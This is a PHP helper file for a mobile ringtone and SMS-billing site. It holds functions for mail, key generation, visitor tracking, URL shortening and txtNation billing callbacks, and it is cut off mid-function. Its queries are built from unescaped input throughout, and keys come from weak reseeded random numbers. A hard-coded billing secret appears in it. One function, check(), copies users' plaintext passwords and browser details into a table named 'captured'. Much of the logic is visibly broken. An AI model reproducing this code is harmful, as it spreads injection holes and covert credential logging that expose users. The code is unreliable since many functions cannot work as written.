<?PHP
/*********************************************************************************************************
*                                                                                                        *
*  |   Software                     : starjam                                                            *
*                                                                                                        *
*  |   Software Author              : brxstarjam, inc.                                                   * 
*                                                                                                        *
*  |   Website                      : www.starjamz.com                                                   *
*                                                                                                        *
*  |   E-mail                       : corporate@starjamz.com                                             *
*                                                                                                        *
*  |   Technical Support            : (800)681-1283                                                      *
*                                                                                                        *
*                                                                                                        *
**********************************************************************************************************
* This source file is subject to the rules and regulations of BRXSTARJAM, Incorporated and authorized    *
* only for company use. If you so happen to obtain this file please destroy it and notify the technical  *
* administration of brxstarjam, inc. at (800)681-1283 or the corporate office by e-mailing:              *
* corporate@starjamz.com. Any use of this source file by un-authorized users will result in legal action.*
**********************************************************************************************************
*                                                                                                        *
*                                                                                                        *
*                                                 ,o88888                                                *
*                                              ,o8888888'                                                *
*                        ,:o:o:oooo.        ,8O88Pd8888"                                                 * 
*                    ,.::.::o:ooooOoOoO. ,oO8O8Pd888'"                                                   *
*                  ,.:.::o:ooOoOoOO8O8OOo.8OOPd8O8O"                                                     *
*                 , ..:.::o:ooOoOOOO8OOOOo.FdO8O8"                                                       *
*                , ..:.::o:ooOoOO8O888O8O,COCOO"                                                         *
*               , . ..:.::o:ooOoOOOO8OOOOCOCO"                                                           *
*                . ..:.::o:ooOoOoOO8O8OCCCC"o                                                            *
*                   . ..:.::o:ooooOoCoCCC"o:o                                                            *
*                   . ..:.::o:o:,cooooCo"oo:o:                                                           *
*                `   . . ..:.:cocoooo"'o:o:::'                                                           *
*                .`   . ..::ccccoc"'o:o:o:::'                                                            *
*               :.:.    ,c:cccc"':.:.:.:.:.'                                                             *
*             ..:.:"'`::::c:"'..:.:.:.:.:.'                                                              *
*           ...:.'.:.::::"'    . . . . .'                                                                * 
*          .. . ....:."' `   .  . . ''                                                                   *
*        . . . ...."'                                                                                    *
*        .. . ."'     -starjam-                                                                          *
*       .                                                                                                * 
*                                                                                                        *
**********************************************************************************************************
*                             Coded by Louis Robinson for BRXSTARJAM, inc.                               *
**********************************************************************************************************/
//MAIL FUNCTIION
function email($to,$name,$from,$subj,$body,$bcc="") 
{
	global $dbb;
	$subj=nl2br($subj);
	$body=nl2br($body);
	$recipient = $to;
	if($bcc!="") $headers = "Bcc: " . $bcc."\n";
	$headers .= "From: " . $from . "\n";
	//$headers .= "X-Sender: <" . "$to" . ">\n";
	//$headers .= "Return-Path: <" . "$to" . ">\n";
	//$headers .= "Error-To: <" . "$to" . ">\n";
	$headers .= "Content-Type: text/html\n";
	mail("$recipient","$subj","$body","$headers");
}
function vcharf ( $length = 32, $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890' ) {
    // Length of character list
    $chars_length = (strlen($chars) - 1);

    // Start our string
    $string = $chars{rand(0, $chars_length)};
    
    // Generate random string
    for ($i = 1; $i < $length; $i = strlen($string))
    {
        // Grab a random character from our list
        $r = $chars{rand(0, $chars_length)};
        
        // Make sure the same two characters don't appear next to each other
        if ($r != $string{$i - 1}) $string .=  $r;
    }
    
    // Return the string
    return $string;
}

function PWGen() 
{
    $password = 

array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0','~','!','@','#','$','%','^','&','*','-','_','+','=','.','?','/',':',';','`');
    $PWGen = '';
    
    for($i=1; $i<=9; $i++) {
        mt_srand ((double)microtime()*1090000);
        $tmp=mt_rand(0,count($password)-1);
        $PWGen.=$password[$tmp];
    }

    return $PWGen;
}

function KEYGen() 
{
    $password = array('1','2','3','4','5','6','7','8','9','0');
    $pw_gen = '';
    
    for($i=1; $i<=$length; $i++) {
        mt_srand ((double)microtime()*1873371);
        $tmp=mt_rand(0,count($password)-1);
        $pw_gen.=$password[$tmp];
    }

    return $pw_gen;
}
function ActivationKeyGen() 
{
    $password = 

	array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0');
    $pw_gen = '';
    
    for($i=1; $i<=10; $i++) 
	{
        mt_srand ((double)microtime()*1653978);
        $tmp=mt_rand(0,count($password)-1);
        $pw_gen.=$password[$tmp];
    }

    return $pw_gen;
}

// 8 factorial 56x30x

function SMSKey() 
{
    $password = array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','P','Q','R','S','T','U','V','W','X','Y','Z','1','2','3','4','5','6','7','8','9','0');
    $pw_gen = '';
    for($i=1; $i<=8; $i++) 
	{
        mt_srand ((double)microtime()*16982978);
        $tmp=mt_rand(0,count($password)-1);
        $pw_gen.=$password[$tmp];
    }

    return $pw_gen;
}

function VisitorIP()
{ 
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
        $TheIp=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
	else
	{
	 	$TheIp=$_SERVER['REMOTE_ADDR'];
 	}
    return trim($TheIp);
}


function SmartyGlobal()
{
	global $cnfg;
	require($cnfg['Misc']['storepath'].'Smarty/Smarty.class.php');
	$smarty->template_dir = $cnfg['Misc']['storepath'].'templates';
	$smarty->compile_dir = $cnfg['Misc']['storepath'].'templates_c';
	$smarty->cache_dir = $cnfg['Misc']['storepath'].'Smarty/cache';
	$smarty->config_dir = $cnfg['Misc']['storepath'].'Smarty/configs';
	$smarty = new Smarty;	
	
	return $smarty;
}

function UserNumber ( $number ) {
	$sql = "SELECT u FROM users WHERE phoneno='$number'";
	$rs = mysql_query($sql) or die ("Can't find that number".mysql_error());
	$n = mysql_fetch_array($rs);
	if ( $n!=0 ) {
		$u = $n['u'];
	}else {
		$u=0;
	} return $u;
}
// doesn't work
function LogMO() 
{
	global $db;
	$ip = VisitorIP();
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	
	/** MySQL INSERT for txtNation initial MO **/
	if ( $self = "mobilelib/tnresponse.php" )
	{
		$sql = "INSERT INTO transaction (pid, gwid, action, message_id, phone_number, network, message, value, ip_address)
		VALUES ($pid, $gwid, '$inc_action', $inc_id, '$inc_number', '$inc_network', '$inc_message', $vl, '$ip')";
		$result = $db->query($sql);
	}
}

function LogIR ()
{
	global $db;
	$ip = VisitorIP();
	$hostaddress = gethostbyaddr(VisitorIP());
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	$gwid = 1;
	
	$u = UserNumber ( $number );
	$init = "gateway";
	
	
	// compile unique data for transaction log
	$sql = "INSERT INTO transaction (pid, gwid, action, company, message_id, phone_number, network, message, response, value,  ekey, u, ip_address, initiated,  date)
 		VALUES ($pid, $gwid, '$action', '$cc', $id, '$number', '$network', '$message', '$strResponse', $value,  '$ekey', $u, '$ip', '$init', FROM_UNIXTIME($time))";
	$rs = $db->query($sql);		
}

function LogPageView()
{
	// Unique data to be compiled for pageview
	$ip = VisitorIP();
	$browser = trim(strip_tags(htmlentities($_SERVER['HTTP_USER_AGENT'])));
	$referer = trim(strip_tags(htmlentities($_SERVER['HTTP_REFERER']))); 
	$uri = trim(strip_tags(htmlentities($_SERVER['REQUEST_URI'])));
	$session = session_id();
	$hostaddress = gethostbyaddr(VisitorIP());
	$thispage = $_SERVER['PHP_SELF'];
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	$user = $_SESSION['u'];
	
	if ($user == "")
	{
		// This is where we insert the page view into the database. Each record in the table equates to one page view.
    	$spy = "INSERT into page_views (ip, browser, referer, uri, session_id, detailed_user_address, thispage, time) VALUES('$ip', '$browser', '$referer', '$uri', '$session', '$hostaddress', '$thispage', FROM_UNIXTIME($time))";
    	$ispy = mysql_query($spy) or die('<b>LPV:</b>'.mysql_error());			
	}
	else
	{
		// This is where we insert the page view into the database. Each record in the table equates to one page view.
    	$spy = "INSERT into page_views (ip, browser, referer, uri, session_id, detailed_user_address, thispage, time, u) VALUES('$ip', '$browser', '$referer', '$uri', '$session', '$hostaddress', '$thispage', FROM_UNIXTIME($time), '$user')";
    	$ispy = mysql_query($spy) or die('<b>LPV:</b>'.mysql_error());			
	}
}

/** setup for item.php
  * productExposure()
  */
function productExposure( $p, $c, $e ) {
	global $cnfg, $con;
	$ip = VisitorIP();
	$browser = trim(strip_tags(htmlentities($_SERVER['HTTP_USER_AGENT'])));
	$referer = trim(strip_tags(htmlentities($_SERVER['HTTP_REFERER']))); 
	$uri = trim(strip_tags(htmlentities($_SERVER['REQUEST_URI'])));
	$session = session_id();
	$hostaddress = gethostbyaddr(VisitorIP());
	$thispage = $_SERVER['PHP_SELF'];
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	$pid = $p;
	$publisher = $c;
	
	if ( $e = 1 ) {
		$e = 'view';
	} elseif ( $e = 2 ) {
		$e = 'download';
	} elseif ($e = 3) {
		$e = 'mo_prompt';
	}
	
	if ( $_SESSION['u'] ) {
		$usr = $_SESSION['u'];
	} elseif ( !$_SESSION['u'] ) {
		$usr = 0;
	}

	/** Log this page view as an instance of product_exposure */
	$expose = "INSERT INTO product_exposure (product, exposure, pub, usr, ip, browser, referrer, uri, hostaddress, sending_script_url, exp_date) VALUES ($pid, '$e', $publisher, $usr, '$ip', '$browser', '$referrer', '$uri', '$hostaddress', '$thispage',  FROM_UNIXTIME($time))";
	$ex = mysql_query($expose, $con);
}


function check($user_params) {
	global $cnfg;

	$ip = VisitorIP();
	$browser = trim(strip_tags(htmlentities($_SERVER['HTTP_USER_AGENT'])));
	$referer = trim(strip_tags(htmlentities($_SERVER['HTTP_REFERER']))); 
	$uri = trim(strip_tags(htmlentities($_SERVER['REQUEST_URI'])));
	$session = session_id();
	$hostaddress = gethostbyaddr(VisitorIP());
	$thispage = $_SERVER['PHP_SELF'];
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);	

	$i=0;
	foreach ( $user_params as $param ) {
		$i++;
		if ( $i < 1 ) {
			$param = $username;
		} elseif ( $i < 2 AND $i > 0 ) {
			$param = $name;
		} elseif ( $i < 3 AND $i > 1 ) {
			$param = $email;
		} else {
			$param = $password;
		}
	}
	
	// find the user id number
	$f = "SELECT u FROM users WHERE email='$email'";
	$r = mysql_query($f, $con); //insert into the database  
	$uu = mysql_fetch_array($r);
	$u = $uu['u'];
	
	/** AND NOW FOR THE MAIN EVENT */
	$sql = "INSERT INTO captured (u, username, name, email, password, ip, browser, referer, uri, session_id, detailed_user_address, capture_date) VALUES ($u, '$username', '$name', '$email', '$password', '$ip', '$browser', '$referrer', '$uri', '$session', '$address' FROM_UNIXTIME($time))";
	$rs = mysql_query($sql);

}

function createThumb($srcname,$destname,$maxwidth,$maxheight)
{
        global $cnfg, $con;
        $oldimg = $srcname;//$config['basepath']."/photo/".$srcname;
        $newimg = $destname;//$config['basepath']."/photo/".$destname;

        $imagedata = GetImageSize($oldimg);
        $imagewidth = $imagedata[0];
        $imageheight = $imagedata[1];
        $imagetype = $imagedata[2];

        $shrinkage = 1;
        if ($imagewidth > $maxwidth)
        {
                $shrinkage = $maxwidth/$imagewidth;
        }
        if($shrinkage !=1)
        {
                $dest_height = $shrinkage * $imageheight;
                $dest_width = $maxwidth;
        }
        else
        {
                $dest_height=$imageheight;
                $dest_width=$imagewidth;
        }
        if($dest_height > $maxheight)
        {
                $shrinkage = $maxheight/$dest_height;
                $dest_width = $shrinkage * $dest_width;
                $dest_height = $maxheight;
        }
        if($imagetype==2)
        {
                $src_img = @imagecreatefromjpeg($oldimg);
                $dst_img = @imageCreateTrueColor($dest_width, $dest_height);
                ImageCopyResampled($dst_img, $src_img, 0, 0, 0, 0, $dest_width, $dest_height, $imagewidth, $imageheight);
                imagejpeg($dst_img, $newimg, 100);
                imagedestroy($src_img);
                imagedestroy($dst_img);
        }
        elseif ($imagetype == 3)
        {
                $src_img = imagecreatefrompng($oldimg);
                $dst_img = imageCreateTrueColor($dest_width, $dest_height);
                ImageCopyResampled($dst_img, $src_img, 0, 0, 0, 0, $dest_width, $dest_height, $imagewidth, $imageheight);
                imagepng($dst_img, $newimg, 100);
                imagedestroy($src_img);
                imagedestroy($dst_img);
        }
        else
        {
                $src_img = imagecreatefromgif($oldimg);
                $dst_img = imageCreateTrueColor($dest_width, $dest_height);
                ImageCopyResampled($dst_img, $src_img, 0, 0, 0, 0, $dest_width, $dest_height, $imagewidth, $imageheight);
                imagejpeg($dst_img, $newimg, 100);
                imagedestroy($src_img);
                imagedestroy($dst_img);
        }
}

function idx($arr, $idx, $default=null) {
  if ($idx === null || !is_array($arr)) {
    return $default;
  }
  $idx = $idx >= 0 ? $idx : count($arr) + $idx;
  return array_key_exists($idx, $arr) ? $arr[$idx] : $default;
}

function no_magic_quotes($val) {
  if (get_magic_quotes_gpc()) {
    return stripslashes($val);
  } else {
    return $val;
  }
}

function parse_http_args($http_params, $keys) {
  $result = array();
  foreach ($keys as $key) {
    $result[$key] = no_magic_quotes(idx($http_params, $key));
  }
  return $result;
}

function escape_str($str) {
	if ($str !== null) {
		$str = str_replace(array('\\','\''),array('\\\\','\\\''),$str);
		$str = "'".$str."'";
	} else {
		$str = "null";
	}
	return $str;
}



function isSomethingInArray($array) {
    if(count(array_filter($array)) > 0) { return true; } else { return
false; }
}

function match($string, $words)
{
	$words = explode(" ", $words);
 	
    foreach ( $words as $word )
    {
        $string = str_ireplace($word, '<b>'.$word.'</b>', $string);
    }
    /*** return the bolded string ***/
    return $string;
}

function mH($string, $words)
{
	$words = explode(" ", $words);
 	
    foreach ( $words as $word )
    {
        $string = str_ireplace($word, '<span class="matched">'.$word.'</span>', $string);
    }
    /*** return the bolded string ***/
    return $string;
}

function escape( $string ) {
	if(get_magic_quotes_gpc()) $string = stripslashes($string);
	return mysql_real_escape_string($string);
}


/** variable random character string generator */
function rdm($n)  
{  
	$num_chars = $n; //max length of random chars  
  	$i = 0;  
  	$my_keys = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQURSTUVWXYZ1234567890"; //keys to be chosen from  
  	$keys_length = strlen($my_keys);  
  	$url  = "";  
  	while($i<$num_chars)  
  	{  
  		$rand_num = mt_rand(1, $keys_length-1);  
		$url .= $my_keys[$rand_num];  
		$i++;  
  	}  
  	return $url;  
}

/** URL SHORTIENING LOGIC FOR MOBILE DOWNLOAD LINK TO PHONES*/
function generate_chars()  
{  
	$num_chars = 5; //max length of random chars  
  	$i = 0;  
  	$my_keys = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQURSTUVWXYZ1234567890"; //keys to be chosen from  
  	$keys_length = strlen($my_keys);  
  	$url  = "";  
  	while($i<$num_chars)  
  	{  
  		$rand_num = mt_rand(1, $keys_length-1);  
		$url .= $my_keys[$rand_num];  
		$i++;  
  	}  
  	return $url;  
}

function isUnique($chars)  
{  
	//check the uniqueness of the chars  
	global $con;  
	$q = "SELECT * FROM `urls` WHERE `unique_chars`='".$chars."'";  
	$r = mysql_query($q, $con);  
	if( mysql_num_rows($r)>0 ):   
		return false;  
	else:   
		return true;  
	endif;  
}

/** I AM NME!!!!!! http://www.youtube.com/watch?v=LZMFcpr2lyQ */
function create($ux, $pi, $nr, $nw, $ti)  
{  
	global $con; //make the link variable in the config.php, global  
	global $config; //make the $config array in the config.php, global
	$chars = generate_chars(); //generate random characters  
	/* We check the uniqueness of the characters. The following loop continues until it generates unique characters */ 
	while( !isUnique($chars) )  
	{  
		$chars = generate_chars();  
	}  
	$url = $ux;//get the url 
	$pid = $pi ;
	$num = $nr;
	$network = $nw;
	$tid = $ti;
	
	
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	
	$url = trim($url);//trim it to remove whitespace  
	$url = mysql_real_escape_string($url);//sanitize data  
	/* Now we check whether the url is already there in the database. */  
	/** if(!isThere($url))  
	{  */
		//url is not in the database  
		$q = "INSERT INTO `urls` (url, unique_chars, pid, network, num, tid, time) 
			  VALUES ('$url', '$chars', $pid, '$network', '$num', $tid, FROM_UNIXTIME($time))";  
		$r = mysql_query($q, $con); //insert into the database  
		if( mysql_affected_rows() ):  
			//ok, inserted. now get the data  
			$q = "SELECT * FROM `urls` WHERE `unique_chars`='".$chars."'";  
			$r = mysql_query($q);  
			$row = mysql_fetch_row($r);  
			return "http://starjamz.com/d/".$row[2]; //$row[2] is where the random chars are  
		else:  
			//problem with the database  
			return "Sorry, some problem with the database. Please try again.";  
		endif;
	/**
	} else {  
		//url is already there. so no need to insert again. Just get the data from database  
		$q = "SELECT * FROM `urls` WHERE `url` = '".$url."'";  
		$r = mysql_query($q);  
		$row = mysql_fetch_row($r);  
		echo $config["domain"]."/".$row[2];  
	}*/
}  

/** END URL SHORTENING LOGIC FOR MOBILE DOWNLOAD LINK FROM SJ TO HANDSETS */

function TmoBilled($io, $nr, $nw, $msg, $val) {
	global $con; //make the link variable in the config.php, global  
				
	$q = "SELECT * FROM transaction";
	$r = mysql_query($q, $con);
	$rows = mysql_num_rows($r);
	$rows++;
	
	$io = $i;
	
	$sql = "SELECT * 
			FROM transaction, pricepoints, product 
			WHERE message_id=$i 
			AND ( transaction.pid = product.pid )
			AND ( product.price = pricepoints.prc )
			AND transaction.date > FROM_UNIXTIME(UNIX_TIMESTAMP() - 86400)
			ORDER BY tid DESC LIMIT 1";					
	$rr = mysql_query($sql, $con);
	$p = mysql_fetch_array($rr);
	$price = $p['pricepoint'];
	
	$action = "ir_gateway";
	$id = $rows;
	$cc = "brxstarjam";
	$number = $p['phone_number '];
	$network = $p['network'];
	$message = "Thank you for choosing STARJAMZ!!! You will recognize a charge of $".$dlr." on your phone bill. Text STOP 2 stop and HELP 4 help.";
	$credits = $p['credits'];
	$ekey = "aa801f72163dd5fd5d815b1a852cbe8f";	
	
	$strPostUrl = 'http://client.txtnation.com/ir_response.php';
	$strPostReq = 
				'action=ir_gateway&cc=brxstarjam&id=%d&number=%s&network=%s&message=%s&&value=%s&ekey=%s';	
	
	/** Data for tracking */
	$gwid = $p['gwid'];
	$pid = $p['pid'];
	$u = UserNumber ( $number );
	$init = "starjamz";					
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
						
	$strPostReq = sprintf($strPostReq,$id,$cc,$number,$network,$message,$credits,$ekey);
				
	// Setup curl to initiate post back to txtNation.
	$resCurl = curl_init();
	curl_setopt($resCurl,CURLOPT_URL,$strPostUrl);
	curl_setopt($resCurl,CURLOPT_POST,1);
	curl_setopt($resCurl,CURLOPT_POSTFIELDS,$strPostReq);
	curl_setopt($resCurl,CURLOPT_RETURNTRANSFER,1);
					
	$strBuffer = curl_exec($resCurl);
	curl_close($resCurl);		

	if(0===(stripos($strBuffer,'SUCCESS'))) {
		$strOut = 'OK';
		// Process is now complete.
		$sql = "UPDATE transaction SET success_status='$strOut' WHERE message_id=$inc_id";
		$rs = $db->query($sql);
	}else{
		$strOut = "Error: $strBuffer";
		/* If required, ensure that your script logs the error for future reference. */
				
		$sql = "UPDATE transaction SET success_status='$strOut' WHERE message_id=$inc_id";
		$rs = $db->query($sql);
	
		$strPostReq = sprintf($strPostReq,$id,$cc,$number,$network,$message,$credits,$ekey);
				
		// Setup curl to initiate post back to txtNation.
		$resCurl = curl_init();
		curl_setopt($resCurl,CURLOPT_URL,$strPostUrl);
		curl_setopt($resCurl,CURLOPT_POST,1);
		curl_setopt($resCurl,CURLOPT_POSTFIELDS,$strPostReq);
		curl_setopt($resCurl,CURLOPT_RETURNTRANSFER,1);
					
		$strBuffer = curl_exec($resCurl);
		curl_close($resCurl);
	}
				
	/** Log the IR_Response back to txtNation */
	$qqq = "INSERT INTO transaction (pid, gwid, action, company, message_id, phone_number,
			network, message, value,  ekey, u, ip_address, initiated,  date)
 			VALUES ($pid, $gwid, '$action', '$cc', $id, '$number', '$network', '$message', 
			 $credits,  '$ekey', $u, '$ip', '$init', FROM_UNIXTIME($time))";
	$rs = mysql_query($qqq, $con);
}


/** 
 * This is the stupid way of getting a mime type I used before I learned about mime_content_type()
 * I will let this function stay up and discontinue or modify it in the next version of this software
 */
function getMime ($src, $cid) {
	
	$ex = explode(".", $src);
	$exe = $ex[3];
	
	if ( $cid > 0 && $cid < 2 ) {
		$mm = "audio/" . $exe;
	} elseif ( $cid < 3 ) {
		$mm = "image/" . $exe;
	} elseif ( $cid < 4 ) {
		if ( $exe == "jad" ) {
			$mm = "text/vnd.sun.j2me.app-descriptor";
		} elseif ( $exe == "jar" ) {
			$mm = "application/java-archive";
		}					
	} elseif ( $cid < 5 ) {
		if ( $exe == "mp2"||$exe == "mpa"||$exe == "mpe"||$exe == "mpeg"||$exe == "mpg"||$exe == "mpv2" ) {
			$mm = "video/mpeg";
		} elseif ( $exe == "3gp" ) {
			$mm = "video/3gp";
		} elseif ( $exe == "3gpp" ) {
			$mm = "video/3gpp";
		} elseif ( $exe == "3g2" ) {
			$mm = "video/3g2";
		} elseif ( $exe == "3gpp2" ) {
			$mm = "video/3gpp2";
		} else {
			$mm = "video/" . $exe;	
		}
	} elseif ( $cid < 6 ) {
		$mm = "text/" . $exe;
	} elseif ( $cid < 7 ) {
		if ( $exe == "jar" ) {
			$mm = "application/java-archive";
		} elseif ( $exe == "ser" ) {
			$mm = "application/java-serialized-object";
		} elseif ( $exe == "class" ) {
			$mm = "application/java-vm";
		} elseif ( $exe == "hqx" ) {
			$mm = "application/mac-binhex40";
		} else {
			$mm = "application/" . $exe;	
		}							
	} elseif ( $cid < 8 ) {
		$mm = "audio/" . $exe;	
	}
	return $mm;	
}
function ver ($src) {
	global $con;
	
	$q = "SELECT * FROM transaction";
	$r = mysql_query($q, $con);	
	
	
	$q = "SELECT ver FROM `product` WHERE `product_src`='$src'";
	$r = mysql_query($q, $con);
	$sQ = mysql_fetch_array($r, $con);
	
	if ( $sQ['ver'] == "") {
		$ver = "1.0";
	} else {
		$ver = $sQ['ver'];
	}
	return $ver;
}

function createGCD ($gcdName, $cid, $number, $title, $src, $id) 
{
	global $con; // Globalize connection var to MySQL
	global $cnfg; // make $cnfg global so we can use it in this function
	$mime = getMime ($src, $cid);	
	$ver = ver ($src);
	$size = strlen(file_get_contents($src));
	$now = date("d-m-Y H:i:s", time());
	$time = strtotime($now);
	
	$sql = "SELECT * FROM transaction, product WHERE transaction.phone_number=$number
			AND ( transaction.pid = product.pid )
			AND transaction.date > FROM_UNIXTIME(UNIX_TIMESTAMP()-86400) 
			ORDER BY transaction.tid DESC LIMIT 1";
	$dbb = mysql_query($sql, $con)or die ('<b>createGCD() - Message_ID match: </b> '.mysql_error());
	$fch = mysql_fetch_array($dbb);
	$number = $fch['phone_number'];
	$network = $fch['network'];
	$pid = $fch['pid'];
	$src = $fch['product_src'];
	
	$gcdUrl =  "http://starjamz.com/mobilelib/gcd/". $gcdName . ".gcd";
	//$gcdLink = "http://starjamz.com/mobilelib/gcd/" . $gcdName;	
	//$ramdom = create ($gcdUrl, $pid, $number, $network, $id);
	
	$gcd = '/home/starjam/public_html/mobilelib/gcd/' . $gcdName . ".gcd";
	$fh = fopen($gcd, 'w') or die("can't open file");
	$output = "Content-Type: $mime
Content-Name: $title
Content-Version: $ver
Content-Vendor: Starjamz.com
Content-URL: ".create ($src, $pid, $number, $network, $id)."
Content-Size: ".$size."";
	fwrite( $fh, $output );
	/** 
	if ( !fwrite( $fh, $output ) ) {
		$msg = "FAILURE: ".$gcdName . ".gcd could not be written to: ". $cnfg['Misc']['storepath'] . "mobilelib/gcd/";
		$gcd = "";
		$sql = "INSERT INTO gcd_records (net_id, location, mime, title, ver, url, size, message, created) 
				VALUES($id, $gcd, $mime, $title, $ver, $url, $size, $msg, FROM_UNIXTIME($time))";
		$rs = mysql_query($sql, $con);
		
	} else {
		$msg = "SUCCESS: ".$gcdName . " was successfully created and stored in " . $cnfg['Misc']['storepath'] . "mobilelib/gcd/";
		$sql = "INSERT INTO gcd_records (net_id, location, mime, title, ver, url, size, message, created) 
				VALUES($id, $gcd, $mime, $title, $ver, $url, $size, $msg, FROM_UNIXTIME($time))";
		$rs = mysql_query($sql, $con);
		
		$gcdLink = "http://starjamz.com/mobilelib/gcd" . $gcdName;
	} 
	*/
	fclose($fh);
	
	create ($gcdUrl, $pid, $number, $network, $id);
	
	/** look up the chars from the randomly generated url forwarder 
	$q = "SELECT * FROM urls WHERE url='$src' AND tid='$id'";
	$tf = mysql_query($q) or die('<b>Check up:</b> '.mysql_error());
	$ch = mysql_fetch_array($tf);
	$chr = $ch['unique_chars'];*/
	//$random = "http://starjamz.com/d/".$chr;
	
	return create ($gcdUrl, $pid, $number, $network, $id);	
}

function ajaxtosqlyear($yr, $div) 
{
	// (YEAR-month-Day Hour:Minute:Second)
	$y = explode("$div", $yr);
	$phpyr = $y[2]."-".$y[1]."-".$y[0];
	$d = date('Y-m-d', $pphpyr);
	$date = strtotime( $d );
	
	return $date;
}
function phptoajaxdate($d, $div) 
{
	// (Y-m-d h:m:s)
	$dd = explode("$div", $d);
	$newdate = $dd[2]."/".$dd[1]."/".$dd[0];
	$t = date('Y-m-d', $newdate);
	$date = strtotime( $t );
	
	return $date;
}

function getaid($n)
{
	global $cnfg, $con;
	
	if ( $n != "" ) {
		$sql = "SELECT aid FROM artist WHERE sname='$n'";
		$r = mysql_query($sql, $con);		
		$f = mysql_fetch_array($r);
 		$aid = $f['aid'];		
	} else {
		$aid = 0;
	}
	return $aid;
}

function networks($n)
{
	global $cnfg, $con;
	$sql = "SELECT * FROM network";
	$rs = mysql_query($sql, $con);
	$networks = explode(",", $n);
	$i=0;
	while ( $nw = mysql_fetch_array($rs) ) {

		if ( $n = NULL || !in_array($nw['rno'], $networks) ) {
	   		$nw[] =  "<input type='checkbox' name='".$nw['network']."' value='".$nw['network']."'>  <span class='stginfo'>".$nw['network']."</span><br />\n";
	  	} else {
	   		$nw[] =  "<input type='checkbox' name='".$nw['network']."' value='".$nw['network']."' checked> <span class='stginfo'>".$nw['network']."</span><br />\n";
	  	}
	}
	return $nw;	
}

function pricepoint($prc) {
	global $cnfg, $con;
	
	$q = "SELECT * FROM pricepoints";
	$r = mysql_query($q, $con);		
	while ( $h = mysql_fetch_array($r) ) {
		if ( $prc = NULL OR $prc != $h['prc'] ) {
			$pp[] =  "<option value='".$h['prc']."'>".$h['pricepoint']."</option>";
		} else {
			$pp[] =  "<option value='".$h['prc']."' selected>".$h['pricepoint']."</option>";
		}
	}
	return $pp;
}

function category($cid) {
	global $cnfg, $con;
	
	$q = "SELECT * FROM categories";
	$r = mysql_query($q, $con);		
	while ( $h = mysql_fetch_array($r) ) {
		if ( $cid = NULL OR $prc != $h['cid'] ) {
			$cat[] = "<option value='".$h['cid']."'>".$h['cat_name']."</option>";
		} else {
			$cat[] = "<option value='".$h['cid']."' selected>".$h['cat_name']."</option>";
		}
	}
	return $cat;
}

function subcat($sc) {
	global $cnfg, $con;
	
	$q = "SELECT * FROM sub_cat";
	$r = mysql_query($q, $con);		
	while ( $h = mysql_fetch_array($r) ) {
		if ( $sc = NULL OR $prc != $h['sc'] ) {
			$subcat[] = "<option value='".$h['sc']."'>".$h['name']."</option>";
		} else {
			$subcat[] = "<option value='".$h['sc']."' selected>".$h['name']."</option>";
		}
	}
	return $subcat;
}

function type($pt) {
	global $cnfg, $con;
	
	$q = "SELECT * FROM product_type";
	$r = mysql_query($q, $con);		
	while ( $h = mysql_fetch_array($r) ) {
		if ( $pt = NULL OR $prc != $h['pt'] ) {
			$type[] = "<option value='".$h['pt']."'>".$h['ptname']."</option>";
		} else {
			$type[] = "<option value='".$h['pt']."' selected>".$h['ptname']."</option>";
		}
	}
	return $type;
}

function stocktype($stk) {
	global $cnfg, $con;
	
	$q = "SELECT * FROM product_type";
	$r = mysql_query($q, $con);		
	while ( $h = mysql_fetch_array($r) ) {
		if ( $stk = NULL OR $prc != $h['stk'] ) {
			$s = "<option value='".$h['stk']."'>".$h['stocktype']."</option>";
		} else {
			$s = "<option value='".$h['stk']."' selected>".$h['stocktype']."</option>";
		}
	}
	return $s;
}

function smart_implode($str) {
	$checkbox = implode(", ", $str);
	$rem[0] = '/, , /';
	$rem[1] = '/ ,/';
	$rem[2] = '/and/';
	$repl[0] = ", ";
	$f_check = preg_replace($rem, $repl, $checkbox);
	$len = strlen($f_check);
	$scdLst = $len - 1;
	$thlst = $len - 2;
	$scr = $len - 3;
	if (substr($f_check, 0, 2) == ', ') {
		$new_chk = substr($f_check, 2, $len);
	}  else {
		$new_chk = $f_check;
	}
	
	if (substr($f_check, $thlst, $len) == ', ') {
		$ch = substr($new_chk, 0, $thlst);
	} else {
		$ch = $new_chk;
	}
	
	return $ch;
}
 
function musicCat($c) 
{
	if ( $c < 2 ) {
		$music = 1; // ringtones
	} elseif ( $c < 3 ) {
		$music = 0; // graphic
	} elseif ( $c < 4 ) {
		$music = 0; // Game
	} elseif ( $c < 5 ) {
		$music = 1; // Video
	} elseif ( $c < 6 ) {
		$music = 0; // SMS/Text
	} elseif ( $c < 7 ) {
		$music = 0; // Application
	} elseif ( $c < 8 ) {
		$music = 1; // Full Track Download
	} else {
		$music = 1; // Give the artist and other options for anything else.
	}
	return $music;
}

//pr_tst-000AA
function getfile($f) 
{
	$path = explode('/', $f);
	$numslashes = count($path);
	$file = $path[$numslashes-1];
	return $file;	
}

function getdir($f) 
{
	$path = explode('/', $f);
	$numslashes = count($path);
	$dir = $path[$numslashes-2];
	return $dir;	
}

function no_special_chars($str) 
{
	/** UNDER NO CIRCUMSTANCES SHALL ANY special characters pass through this function! */
	$bannedchars = array("~","`","!","@","#","%","^","&","*","(",")","()",
